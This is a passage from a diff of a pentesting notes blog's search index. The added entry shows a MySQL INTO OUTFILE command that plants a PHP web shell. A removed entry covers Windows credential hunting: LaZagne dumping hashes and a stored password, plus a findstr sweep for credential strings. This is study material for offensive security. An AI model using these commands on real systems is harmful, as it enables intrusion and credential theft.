class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Exploitation</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>Exploitation</tag>
+        <tag>MySQL-Read-Files</tag>
+        <tag>MySQL-Write-Files</tag>
       </tags>
   </entry>
   <entry>
@@ -1162,54 +1215,6 @@
       <tags>
         <tag>mimikatz</tag>
         <tag>Invoke-TheHash</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Credential Hunting</title>
-    <url>/2025/11/26/Windows-Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
-<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
-<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
-<li><code>Passwords in scripts in the SYSVOL share</code></li>
-<li><code>Password in scripts on IT shares</code></li>
-<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
-<li><code>Password in unattend.xml</code></li>
-<li><code>Passwords in the AD user or computer description fields</code></li>
-<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
-<li><code>Found on user systems and shares</code></li>
-<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
-</ul>
-<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
-<ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
-</ul>
-<p>Administrator Access :</p>
-<ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-<li><code>KeePass memory extraction</code></li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
       </tags>
   </entry>
 </search>
